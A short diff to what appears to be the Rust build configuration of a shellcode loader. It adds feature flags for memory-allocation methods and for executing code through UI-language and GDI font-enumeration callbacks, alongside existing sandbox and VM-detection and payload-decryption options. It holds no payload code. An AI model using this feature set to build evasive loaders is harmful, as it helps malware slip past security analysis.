@@ -45,10 +45,13 @@ decrypt_uuid = ["base64_decode"]               # 启用UUID解密
 
 # 内存分配方式
 alloc_mem_va = []
+alloc_mem_global = []
+alloc_mem_local = []
 
 # 注入/执行方式
 run_create_thread = []
-
+run_enum_ui = []
+run_gdi_families = []
 
 # 虚拟机/沙箱检测特性
 sandbox = []
@@ -57,7 +60,6 @@ vm_check_mouse = ["sandbox"]
 vm_check_desktop_files = ["sandbox"]
 
 with_forgery = []
-
 
 [profile.release]
 opt-level = 3
